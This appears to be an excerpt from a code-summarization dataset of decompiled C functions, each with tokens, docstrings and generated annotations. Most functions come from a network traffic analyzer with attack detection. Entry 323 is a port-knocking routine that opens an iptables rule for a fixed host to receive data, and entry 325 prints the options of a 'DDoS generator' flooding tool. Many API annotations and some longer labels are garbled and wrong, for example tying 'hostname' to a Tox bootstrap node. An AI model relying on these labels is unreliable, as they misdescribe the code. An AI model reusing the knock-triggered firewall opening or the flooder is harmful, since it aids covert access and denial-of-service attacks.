            "0x1C2u",
            ",",
            "\"traffana_extract_flow_info\"",
            ")",
            ";",
            "v6",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "key",
            ".",
            "src_port",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "flow",
            "-",
            ">",
            "src_addr",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "key",
            ".",
            "src_addr",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "flow",
            "-",
            ">",
            "src_port",
            "=",
            "v6",
            ";",
            "traffana_dump_flow",
            "(",
            "flow",
            ")",
            ";",
            "if",
            "(",
            "flow",
            "!",
            "=",
            "*",
            "(",
            "traffana_flow_t",
            "*",
            "*",
            ")",
            "tsearch",
            "(",
            "flow",
            ",",
            "&",
            "flow_tree",
            ",",
            "compare_func",
            ")",
            ")",
            "__assert_fail",
            "(",
            "\"*found == flow\"",
            ",",
            "\"traffana.c\"",
            ",",
            "0x1C9u",
            ",",
            "\"traffana_extract_flow_info\"",
            ")",
            ";",
            "if",
            "(",
            "input",
            "-",
            ">",
            "src_threshold",
            ")",
            "traffana_track_source_addr",
            "(",
            "&",
            "key",
            ",",
            "epoch",
            ")",
            ";",
            "if",
            "(",
            "!",
            "epoch",
            "-",
            ">",
            "attack_detected",
            "&",
            "&",
            "(",
            "input",
            "-",
            ">",
            "pkt_threshold",
            "&",
            "&",
            "epoch",
            "-",
            ">",
            "num_pkts",
            ">",
            "input",
            "-",
            ">",
            "pkt_threshold",
            "|",
            "|",
            "input",
            "-",
            ">",
            "byte_threshold",
            "&",
            "&",
            "epoch",
            "-",
            ">",
            "num_bytes",
            ">",
            "input",
            "-",
            ">",
            "byte_threshold",
            "|",
            "|",
            "input",
            "-",
            ">",
            "flow_threshold",
            "&",
            "&",
            "epoch",
            "-",
            ">",
            "num_flows",
            ">",
            "input",
            "-",
            ">",
            "flow_threshold",
            "|",
            "|",
            "input",
            "-",
            ">",
            "src_threshold",
            "&",
            "&",
            "epoch",
            "-",
            ">",
            "num_src_addrs",
            ">",
            "input",
            "-",
            ">",
            "src_threshold",
            ")",
            ")",
            "{",
            "epoch",
            "-",
            ">",
            "attack_detected",
            "=",
            "1",
            ";",
            "traffana_log_attackinfo",
            "(",
            "input",
            ",",
            "epoch",
            ",",
            "curr_time",
            ")",
            ";",
            "}",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided C code is a function named `traffana_extract_flow_info` that extracts flow information from network packets, tracks various packet statistics per epoch, and detects network attacks based on specified thresholds, employing tuple-based comparison functions to manage flow data structures."
    },
    {
        "id": 317,
        "docstring_tokens": [
            "The",
            "function",
            "traffana_print_stats",
            "prints",
            "traffic",
            "statistics",
            "based",
            "on",
            "the",
            "input",
            "'s",
            "verbosity",
            "level",
            "to",
            "the",
            "log",
            "file",
            "specified",
            "in",
            "the",
            "input",
            "structure",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "traffana_epoch_t",
            "*",
            "epoch",
            ",",
            "traffana_input_t",
            "*",
            "input",
            ")",
            "{",
            "if",
            "(",
            "input",
            "-",
            ">",
            "verbose",
            ")",
            "fprintf",
            "(",
            "input",
            "-",
            ">",
            "loghdl",
            ",",
            "\"%.6f  %-6u  %-10u  %-4u %-6u %-6u %-6u %-4u %-4u %-4u\\n\"",
            ",",
            "input",
            "-",
            ">",
            "global_time",
            ",",
            "epoch",
            "-",
            ">",
            "num_pkts",
            ",",
            "epoch",
            "-",
            ">",
            "num_bytes",
            ",",
            "epoch",
            "-",
            ">",
            "num_flows",
            ",",
            "epoch",
            "-",
            ">",
            "num_tcp_pkts",
            ",",
            "epoch",
            "-",
            ">",
            "num_udp_pkts",
            ",",
            "epoch",
            "-",
            ">",
            "num_icmp_pkts",
            ",",
            "epoch",
            "-",
            ">",
            "num_other_pkts",
            ",",
            "epoch",
            "-",
            ">",
            "num_tcp_flows",
            ",",
            "epoch",
            "-",
            ">",
            "num_udp_flows",
            ")",
            ";",
            "else",
            "fprintf",
            "(",
            "input",
            "-",
            ">",
            "loghdl",
            ",",
            "\"%.6f  %-6u  %-10u  %-4u\\n\"",
            ",",
            "input",
            "-",
            ">",
            "global_time",
            ",",
            "epoch",
            "-",
            ">",
            "num_pkts",
            ",",
            "epoch",
            "-",
            ">",
            "num_bytes",
            ",",
            "epoch",
            "-",
            ">",
            "num_flows",
            ")",
            ";",
            "fflush",
            "(",
            "input",
            "-",
            ">",
            "loghdl",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The code is a function that prints traffic statistics to a log file, with the option to include detailed packet and flow information based on the verbose flag in the input."
    },
    {
        "id": 318,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "logs",
            "packet",
            "information",
            "per",
            "epoch",
            ",",
            "updating",
            "global",
            "time",
            "and",
            "printing",
            "statistics",
            "if",
            "epoch",
            "time",
            "has",
            "passed",
            ",",
            "adding",
            "packet",
            "information",
            "to",
            "the",
            "epoch",
            "structure",
            ",",
            "extracting",
            "flow",
            "information",
            ",",
            "and",
            "incrementing",
            "packet",
            "count",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "traffana_epoch_t",
            "*",
            "epoch",
            ",",
            "traffana_input_t",
            "*",
            "input",
            ",",
            "pcap_pkthdr",
            "*",
            "hdr",
            ",",
            "const",
            "uint8_t",
            "*",
            "data",
            ")",
            "{",
            "__int16",
            "v4",
            ";",
            "uint16_t",
            "i",
            ";",
            "uint16_t",
            "num_epochs",
            ";",
            "v4",
            "=",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "data",
            "+",
            "6",
            ")",
            ";",
            "if",
            "(",
            "v4",
            "=",
            "=",
            "htons",
            "(",
            "0x800u",
            ")",
            ")",
            "{",
            "if",
            "(",
            "input",
            "-",
            ">",
            "global_time",
            "=",
            "=",
            "0",
            ".",
            "0",
            ")",
            "input",
            "-",
            ">",
            "global_time",
            "=",
            "(",
            "double",
            ")",
            "(",
            "int",
            ")",
            "hdr",
            "-",
            ">",
            "ts",
            ".",
            "tv_usec",
            "/",
            "1000000",
            ".",
            "0",
            "+",
            "(",
            "double",
            ")",
            "(",
            "int",
            ")",
            "hdr",
            "-",
            ">",
            "ts",
            ".",
            "tv_sec",
            ";",
            "curr_time_6418",
            "=",
            "(",
            "double",
            ")",
            "(",
            "int",
            ")",
            "hdr",
            "-",
            ">",
            "ts",
            ".",
            "tv_usec",
            "/",
            "1000000",
            ".",
            "0",
            "+",
            "(",
            "double",
            ")",
            "(",
            "int",
            ")",
            "hdr",
            "-",
            ">",
            "ts",
            ".",
            "tv_sec",
            ";",
            "if",
            "(",
            "curr_time_6418",
            "-",
            "input",
            "-",
            ">",
            "global_time",
            ">",
            "input",
            "-",
            ">",
            "epoch",
            ")",
            "{",
            "num_epochs",
            "=",
            "(",
            "int",
            ")",
            "(",
            "(",
            "curr_time_6418",
            "-",
            "input",
            "-",
            ">",
            "global_time",
            ")",
            "/",
            "input",
            "-",
            ">",
            "epoch",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "num_epochs",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "traffana_print_stats",
            "(",
            "epoch",
            ",",
            "input",
            ")",
            ";",
            "input",
            "-",
            ">",
            "global_time",
            "=",
            "input",
            "-",
            ">",
            "epoch",
            "+",
            "input",
            "-",
            ">",
            "global_time",
            ";",
            "memset",
            "(",
            "epoch",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "traffana_epoch_t",
            ")",
            ")",
            ";",
            "traffana_delete_flow_tree",
            "(",
            ")",
            ";",
            "if",
            "(",
            "input",
            "-",
            ">",
            "src_threshold",
            ")",
            "{",
            "hdestroy_r",
            "(",
            "&",
            "saddr_htbl",
            ")",
            ";",
            "memset",
            "(",
            "&",
            "saddr_htbl",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "saddr_htbl",
            ")",
            ")",
            ";",
            "hcreate_r",
            "(",
            "0xFFFFuL",
            "L",
            ",",
            "&",
            "saddr_htbl",
            ")",
            ";",
            "}",
            "}",
            "}",
            "+",
            "+",
            "epoch",
            "-",
            ">",
            "num_pkts",
            ";",
            "epoch",
            "-",
            ">",
            "num_bytes",
            "+",
            "=",
            "hdr",
            "-",
            ">",
            "len",
            ";",
            "traffana_extract_flow_info",
            "(",
            "input",
            ",",
            "epoch",
            ",",
            "data",
            ",",
            "curr_time_6418",
            ")",
            ";",
            "+",
            "+",
            "curr_pkt_6419",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "Based on the function name \"traffana_print_\" and the provided empty code snippets, it appears that this function is intended to print or display traffic analytics data, likely formatted in a specific way.",
            "The `memset` function is used to fill a block of memory with a particular value, typically used for initializing memory or setting specific byte patterns within the memory block."
        ],
        "longer_label": "The code appears to be a function for logging and processing packet traffic data per epoch, including updating global time, printing statistics, updating packet and byte counts, and extracting flow information."
    },
    {
        "id": 319,
        "docstring_tokens": [
            "The",
            "code",
            "analyzes",
            "a",
            "pcap",
            "file",
            "and",
            "logs",
            "packet",
            "information",
            "per",
            "epoch",
            ",",
            "printing",
            "statistics",
            "at",
            "the",
            "end",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "traffana_input_t",
            "*",
            "input",
            ")",
            "{",
            "pcap_pkthdr",
            "*",
            "hdr",
            ";",
            "const",
            "uint8_t",
            "*",
            "data",
            ";",
            "pcap_t",
            "*",
            "pcap_hdl",
            ";",
            "traffana_epoch_t",
            "epoch",
            ";",
            "char",
            "errbuf",
            "[",
            "256",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "v6",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "pcap_hdl",
            "=",
            "(",
            "pcap_t",
            "*",
            ")",
            "pcap_open_offline",
            "(",
            "input",
            ",",
            "errbuf",
            ")",
            ";",
            "if",
            "(",
            "pcap_hdl",
            ")",
            "{",
            "memset",
            "(",
            "&",
            "epoch",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "epoch",
            ")",
            ")",
            ";",
            "while",
            "(",
            "(",
            "int",
            ")",
            "pcap_next_ex",
            "(",
            "pcap_hdl",
            ",",
            "&",
            "hdr",
            ",",
            "&",
            "data",
            ")",
            ">",
            "=",
            "0",
            ")",
            "traffana_log_pkt_per_epoch",
            "(",
            "&",
            "epoch",
            ",",
            "input",
            ",",
            "hdr",
            ",",
            "data",
            ")",
            ";",
            "if",
            "(",
            "epoch",
            ".",
            "num_pkts",
            ")",
            "traffana_print_stats",
            "(",
            "&",
            "epoch",
            ",",
            "input",
            ")",
            ";",
            "fclose",
            "(",
            "input",
            "-",
            ">",
            "loghdl",
            ")",
            ";",
            "}",
            "else",
            "{",
            "puts",
            "(",
            "errbuf",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "",
            "The `memset` function is used to fill a block of memory with a particular value, typically used for initialization or clearing memory.",
            "The function `_next` appears to be a common naming convention used for iterating through linked lists or performing sequential operations, as seen in the provided code snippets involving iteration through various data structures like lists and regular expression matchers.",
            "The function \"pkt_per_ep\" likely calculates the number of packets per endpoint in a network communication system, aggregating data from the provided code snippets to analyze packet traffic distribution across endpoints.",
            "The function `ana_print_stats` likely analyzes data and prints out statistical summaries or insights based on the provided code snippets, although without the actual code, it's challenging to determine the exact functionality."
        ],
        "longer_label": "The code `traffana_analyze_pcap` analyzes a PCAP file by opening it, iterating through its packets to log them per epoch, printing statistics if packets are present, and closing the log file if the PCAP file is successfully opened; it utilizes `memset` for initializing memory and likely employs a common naming convention for iteration with `_next`."
    },
    {
        "id": 320,
        "docstring_tokens": [
            "The",
            "code",
            "captures",
            "live",
            "network",
            "traffic",
            "on",
            "a",
            "specified",
            "interface",
            "using",
            "pcap",
            ",",
            "logging",
            "packets",
            "per",
            "epoch",
            "and",
            "printing",
            "statistics",
            "if",
            "packets",
            "were",
            "captured",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "traffana_input_t",
            "*",
            "input",
            ")",
            "{",
            "pcap_t",
            "*",
            "pcap_hdl",
            ";",
            "const",
            "uint8_t",
            "*",
            "data",
            ";",
            "pcap_pkthdr",
            "hdr",
            ";",
            "traffana_epoch_t",
            "epoch",
            ";",
            "char",
            "errbuf",
            "[",
            "256",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "v6",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "pcap_hdl",
            "=",
            "(",
            "pcap_t",
            "*",
            ")",
            "pcap_open_live",
            "(",
            "input",
            "-",
            ">",
            "interface",
            ",",
            "0x2000L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "0xFFFFFFFFL",
            "L",
            ",",
            "errbuf",
            ")",
            ";",
            "if",
            "(",
            "pcap_hdl",
            ")",
            "{",
            "memset",
            "(",
            "&",
            "epoch",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "epoch",
            ")",
            ")",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "do",
            "data",
            "=",
            "(",
            "const",
            "uint8_t",
            "*",
            ")",
            "pcap_next",
            "(",
            "pcap_hdl",
            ",",
            "&",
            "hdr",
            ")",
            ";",
            "while",
            "(",
            "!",
            "data",
            ")",
            ";",
            "traffana_log_pkt_per_epoch",
            "(",
            "&",
            "epoch",
            ",",
            "input",
            ",",
            "&",
            "hdr",
            ",",
            "data",
            ")",
            ";",
            "}",
            "}",
            "puts",
            "(",
            "errbuf",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The provided code snippets and definitions suggest the function `memset` is being redefined or extended to integrate with a specific runtime (likely a SEL4 runtime) to handle memory setting operations, likely to zero out or initialize memory blocks with a given value across the application.",
            "The function \"pkt_per_\" likely handles the transmission of packets using AF_XDP (AF_XDP send packet) with options for batching or polling, and potentially interfaces with PTP (Precision Time Protocol) functions and RNDIS (Remote Network Driver Interface Specification) configurations."
        ],
        "longer_label": "The code defines a function `traffana_capture_live` which integrates with a specific runtime to handle memory setting operations and handles the transmission of packets using AF_XDP with options for batching or polling, potentially interfacing with PTP functions and RNDIS configurations."
    },
    {
        "id": 321,
        "docstring_tokens": [
            "The",
            "function",
            "traffana_handle_sigint",
            "handles",
            "a",
            "SIGINT",
            "signal",
            "by",
            "flushing",
            "log",
            "files",
            ",",
            "deleting",
            "a",
            "flow",
            "tree",
            ",",
            "and",
            "exiting",
            "the",
            "program",
            "after",
            "destroying",
            "a",
            "hash",
            "table",
            "if",
            "a",
            "source",
            "threshold",
            "is",
            "provided",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "traffana_handle_sigint",
            "(",
            "int",
            "sig",
            ")",
            "{",
            "fflush",
            "(",
            "input",
            ".",
            "loghdl",
            ")",
            ";",
            "fflush",
            "(",
            "input",
            ".",
            "attack_loghdl",
            ")",
            ";",
            "traffana_delete_flow_tree",
            "(",
            ")",
            ";",
            "if",
            "(",
            "input",
            ".",
            "src_threshold",
            ")",
            "hdestroy_r",
            "(",
            "&",
            "saddr_htbl",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"ana_delete_flow\" likely deletes a flow or a set of flows within a program or system, but without any specific code snippets provided, the exact implementation and usage cannot be determined.",
            "The function `hdestroy_r` is part of the hash table manipulation functions in the C programming language, designed to destroy a hash table and its associated entries in a thread-safe manner."
        ],
        "longer_label": "The provided code is a signal handler for SIGINT which flushes log files, deletes a flow tree, and potentially destroys a hash table, ensuring a clean exit from the program."
    },
    {
        "id": 322,
        "docstring_tokens": [
            "This",
            "code",
            "creates",
            "an",
            "attack",
            "log",
            "file",
            "with",
            "the",
            "hostname",
            "of",
            "the",
            "machine",
            "as",
            "part",
            "of",
            "the",
            "filename",
            "and",
            "opens",
            "it",
            "for",
            "writing",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "traffana_input_t",
            "*",
            "input",
            ")",
            "{",
            "char",
            "hostname",
            "[",
            "64",
            "]",
            ";",
            "char",
            "filename",
            "[",
            "80",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "v3",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "gethostname",
            "(",
            "hostname",
            ",",
            "0x40uL",
            "L",
            ")",
            ")",
            "__assert_fail",
            "(",
            "\"ret == 0\"",
            ",",
            "\"traffana.c\"",
            ",",
            "0x2A0u",
            ",",
            "\"traffana_create_attack_logfile\"",
            ")",
            ";",
            "snprintf",
            "(",
            "filename",
            ",",
            "0x50uL",
            "L",
            ",",
            "\"%s.attackinfo\"",
            ",",
            "hostname",
            ")",
            ";",
            "input",
            "-",
            ">",
            "attack_loghdl",
            "=",
            "fopen",
            "(",
            "filename",
            ",",
            "modes",
            ")",
            ";",
            "if",
            "(",
            "!",
            "input",
            "-",
            ">",
            "attack_loghdl",
            ")",
            "{",
            "perror",
            "(",
            "\"Error creating output file. Reason\"",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is likely used to read a 64-bit quadword (8 bytes) from the FS segment register, which is often utilized in low-level system programming for accessing thread information or other specific data structures stored in the FS segment, especially in the context of Windows kernel programming or operating system development.",
            "The `hostname` function likely initiates a connection to a Tox bootstrap node using UDP, providing the node's hostname or IP address, port, and public key for setup.",
            "The function `snprintf` is used to format a string into a buffer, preventing buffer overflow by specifying the maximum size of the buffer, and it is commonly used for constructing file paths or formatted strings in C/C++ code."
        ],
        "longer_label": "The code defines a function `traffana_create_attack_logfile` which creates a logfile for recording attack information, utilizing system functions to obtain the hostname, format the filename, and handle file operations, with annotations suggesting low-level system interaction and network setup."
    },
    {
        "id": 323,
        "docstring_tokens": [
            "The",
            "code",
            "parses",
            "a",
            "TCP",
            "packet",
            ",",
            "checks",
            "the",
            "length",
            "of",
            "the",
            "packet",
            ",",
            "prints",
            "out",
            "the",
            "source",
            "and",
            "destination",
            "ports",
            ",",
            "checks",
            "for",
            "a",
            "specific",
            "pattern",
            "in",
            "the",
            "destination",
            "port",
            ",",
            "and",
            "executes",
            "certain",
            "actions",
            "based",
            "on",
            "the",
            "pattern",
            "detected",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "u_char",
            "*",
            "args",
            ",",
            "const",
            "pcap_pkthdr",
            "*",
            "pkthdr",
            ",",
            "const",
            "u_char",
            "*",
            "packet",
            ")",
            "{",
            "uint16_t",
            "v3",
            ";",
            "uint16_t",
            "v4",
            ";",
            "uint16_t",
            "v5",
            ";",
            "const",
            "sniff_tcp",
            "*",
            "tcp",
            ";",
            "unsigned",
            "int",
            "k",
            ";",
            "puts",
            "(",
            "\"TCP Packet\"",
            ")",
            ";",
            "tcp",
            "=",
            "(",
            "const",
            "sniff_tcp",
            "*",
            ")",
            "&",
            "packet",
            "[",
            "4",
            "*",
            "(",
            "packet",
            "[",
            "14",
            "]",
            "&",
            "0xF",
            ")",
            "+",
            "14",
            "]",
            ";",
            "if",
            "(",
            "4",
            "*",
            "(",
            "tcp",
            "-",
            ">",
            "th_offx2",
            ">",
            ">",
            "4",
            ")",
            "<",
            "=",
            "19",
            ")",
            "{",
            "perror",
            "(",
            "\"TCP: Control packet length is incorrect\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "v3",
            "=",
            "ntohs",
            "(",
            "tcp",
            "-",
            ">",
            "th_sport",
            ")",
            ";",
            "printf",
            "(",
            "\"Source port: %d\\n\"",
            ",",
            "v3",
            ")",
            ";",
            "v4",
            "=",
            "ntohs",
            "(",
            "tcp",
            "-",
            ">",
            "th_dport",
            ")",
            ";",
            "printf",
            "(",
            "\"Destination port: %d\\n\"",
            ",",
            "v4",
            ")",
            ";",
            "ntohs",
            "(",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "packet",
            "+",
            "8",
            ")",
            ")",
            ";",
            "v5",
            "=",
            "ntohs",
            "(",
            "tcp",
            "-",
            ">",
            "th_dport",
            ")",
            ";",
            "printf",
            "(",
            "\"PORT KNOCKING ON: %d\\n\"",
            ",",
            "v5",
            ")",
            ";",
            "for",
            "(",
            "k",
            "=",
            "0",
            ";",
            "k",
            "<",
            "=",
            "1",
            ";",
            "+",
            "+",
            "k",
            ")",
            "{",
            "if",
            "(",
            "pattern",
            "[",
            "k",
            "]",
            "=",
            "=",
            "tcp",
            "-",
            ">",
            "th_dport",
            ")",
            "knocking",
            "[",
            "k",
            "]",
            "=",
            "1",
            ";",
            "}",
            "if",
            "(",
            "knocking",
            "[",
            "0",
            "]",
            "=",
            "=",
            "1",
            "&",
            "&",
            "knocking",
            "[",
            "1",
            "]",
            "=",
            "=",
            "1",
            ")",
            "{",
            "system",
            "(",
            "\"iptables -I INPUT 1 -p tcp -s 192.168.0.100 --dport 8505 -j ACCEPT\"",
            ")",
            ";",
            "puts",
            "(",
            "\"WAITING FOR DATA\"",
            ")",
            ";",
            "recv_results",
            "(",
            "\"192.168.0.100\"",
            ",",
            "0x2139u",
            ",",
            "\".results\"",
            ")",
            ";",
            "system",
            "(",
            "\"iptables -D INPUT -p tcp -s 192.168.0.100 --dport 8505 -j ACCEPT\"",
            ")",
            ";",
            "pcap_breakloop",
            "(",
            "interfaceinfo",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `printf` is being redefined and modified to accommodate a Reverse Polish Notation (RPN) calculator, with additional functionalities such as handling operators and operands, while also considering platform-specific behavior for printing special characters representing infinity and NaN values."
        ],
        "longer_label": "The provided C code parses TCP packets, identifies port knocking attempts, and dynamically modifies firewall rules based on specified port sequences, while the annotations suggest a modification to the `printf` function for integrating a Reverse Polish Notation (RPN) calculator with platform-specific considerations for special character printing."
    },
    {
        "id": 324,
        "docstring_tokens": [
            "The",
            "code",
            "initializes",
            "variables",
            ",",
            "reads",
            "input",
            "from",
            "command",
            "line",
            "arguments",
            ",",
            "creates",
            "an",
            "attack",
            "logfile",
            ",",
            "analyzes",
            "a",
            "pcap",
            "file",
            "or",
            "live",
            "traffic",
            "based",
            "on",
            "input",
            ",",
            "deletes",
            "a",
            "flow",
            "tree",
            ",",
            "and",
            "destroys",
            "a",
            "hash",
            "table",
            "if",
            "a",
            "source",
            "threshold",
            "is",
            "set",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "memset",
            "(",
            "&",
            "input",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "input",
            ")",
            ")",
            ";",
            "traffana_read_input",
            "(",
            "&",
            "input",
            ",",
            "(",
            "char",
            "*",
            "*",
            ")",
            "argv",
            ",",
            "argc",
            ")",
            ";",
            "if",
            "(",
            "input",
            ".",
            "src_threshold",
            ")",
            "{",
            "memset",
            "(",
            "&",
            "saddr_htbl",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "saddr_htbl",
            ")",
            ")",
            ";",
            "if",
            "(",
            "!",
            "hcreate_r",
            "(",
            "0xFFFFuL",
            "L",
            ",",
            "&",
            "saddr_htbl",
            ")",
            ")",
            "__assert_fail",
            "(",
            "\"rc\"",
            ",",
            "\"traffana.c\"",
            ",",
            "0x2BEu",
            ",",
            "\"main\"",
            ")",
            ";",
            "}",
            "traffana_create_attack_logfile",
            "(",
            "&",
            "input",
            ")",
            ";",
            "if",
            "(",
            "input",
            ".",
            "pcap_file",
            "[",
            "0",
            "]",
            ")",
            "{",
            "traffana_analyze_pcap",
            "(",
            "&",
            "input",
            ")",
            ";",
            "}",
            "else",
            "if",
            "(",
            "input",
            ".",
            "interface",
            "[",
            "0",
            "]",
            ")",
            "{",
            "signal",
            "(",
            "2",
            ",",
            "(",
            "__sighandler_t",
            ")",
            "traffana_handle_sigint",
            ")",
            ";",
            "traffana_capture_live",
            "(",
            "&",
            "input",
            ")",
            ";",
            "}",
            "traffana_delete_flow_tree",
            "(",
            ")",
            ";",
            "if",
            "(",
            "input",
            ".",
            "src_threshold",
            ")",
            "hdestroy_r",
            "(",
            "&",
            "saddr_htbl",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `ana_read` is used to read analog configuration registers related to USB in different chip families, with specific implementations for VR9 and AR10 chipsets, and possibly additional handling for PMIC configuration reading.",
            "The function `memset` is being implemented or defined multiple times with variations across different code snippets, primarily for memory manipulation tasks like setting blocks of memory to a specific value or copying memory regions, likely to ensure compatibility and optimization across different architectures and environments.",
            "The function `create_r` likely initializes and maintains a set of counters for various administrative commands executed and their outcomes, possibly within a system or network management context.",
            "The `assert` function is used to verify conditions or assumptions within the code, raising an error if the condition evaluates to false, ensuring the program behaves correctly and preventing unexpected behavior.",
            "The function \"ana_create_attack_log\" likely generates or populates a log file with information related to attacks or security incidents in a system or network environment.",
            "The function `ana_analyze_p` likely performs analysis on data or text inputs, possibly related to linguistic or statistical analysis, but without code snippets, it's difficult to provide a precise explanation.",
            "The function `ana_delete` appears to be involved in managing buffers for a lexical analyzer (`katana`) by providing functionalities like creating, deleting, switching, and flushing buffers, likely for handling input streams in parsing processes.",
            "The function `reshold` appears to calculate a symbol's approximate bit cost for compression purposes based on a given symbol table, table log, symbol value, and accuracy log, potentially utilized within compression algorithms like FSE (Finite State Entropy), while the other snippets show structures and macros likely unrelated to the function's purpose.",
            "The function `hdestroy_r` is used to deallocate memory associated with a hash table and its entries in a reentrant manner, as part of the hash table management functions in the C standard library."
        ],
        "longer_label": "The main function initializes input parameters, creates an attack logfile, analyzes pcap or live traffic based on input, and deletes flow tree and hash table if source threshold is set."
    },
    {
        "id": 325,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "called",
            "usage",
            "that",
            "prints",
            "out",
            "information",
            "about",
            "a",
            "DDoS",
            "generator",
            "program",
            "and",
            "its",
            "usage",
            "options",
            "before",
            "exiting",
            "."
        ],
        "code_tokens": [
            "void",
            "__noreturn",
            "FUN0",
            "(",
            ")",
            "{",
            "__printf_chk",
            "(",
            "1L",
            "L",
            ",",
            "\"DDoS generator %s\\n\"",
            ",",
            "\"2012-02-17.01\"",
            ")",
            ";",
            "puts",
            "(",
            "\"Usage:\"",
            ")",
            ";",
            "puts",
            "(",
            "\"ddosgen <options>\"",
            ")",
            ";",
            "puts",
            "(",
            "\" -s : src ip\"",
            ")",
            ";",
            "puts",
            "(",
            "\" -d : dst ip\"",
            ")",
            ";",
            "puts",
            "(",
            "\" -S : src port\"",
            ")",
            ";",
            "puts",
            "(",
            "\" -D : dst port (0 - ports from range 1024-65000)\"",
            ")",
            ";",
            "puts",
            "(",
            "\" -l : packet length (including ip and udp header)\"",
            ")",
            ";",
            "puts",
            "(",
            "\" -t : number of threads\"",
            ")",
            ";",
            "puts",
            "(",
            "\" -r : refresh statistics every n secs \"",
            ")",
            ";",
            "puts",
            "(",
            "\" -p : packets per seconds\"",
            ")",
            ";",
            "puts",
            "(",
            "\" -B : set send buffer size (default 50KB)\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code defines a function named `usage` which prints usage information for a DDoS generator program, including options for source and destination IP addresses, ports, packet length, number of threads, refresh rate for statistics, packets per second, and send buffer size, before exiting the program."
    },
    {
        "id": 326,
        "docstring_tokens": [
            "The",
            "code",
            "calculates",
            "the",
            "Internet",
            "checksum",
            "value",
            "for",
            "a",
            "given",
            "address",
            "and",
            "length",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__m128i",
            "*",
            "a1",
            ",",
            "int",
            "a2",
            ")",
            "{",
            "int",
            "v2",
            ";",
            "unsigned",
            "int",
            "v3",
            ";",
            "unsigned",
            "int",
            "v4",
            ";",
            "__m128i",
            "v5",
            ";",
            "const",
            "__m128i",
            "*",
            "v6",
            ";",
            "__m128i",
            "v7",
            ";",
            "__m128i",
            "v8",
            ";",
            "unsigned",
            "__int16",
            "*",
            "v9",
            ";",
            "int",
            "v10",
            ";",
            "int",
            "v11",
            ";",
            "unsigned",
            "__int16",
            "v13",
            ";",
            "HIBYTE",
            "(",
            "v13",
            ")",
            "=",
            "0",
            ";",
            "if",
            "(",
            "a2",
            ">",
            "1",
            ")",
            "{",
            "v2",
            "=",
            "a2",
            "-",
            "2",
            ";",
            "v3",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "a2",
            "-",
            "2",
            ")",
            ">",
            ">",
            "1",
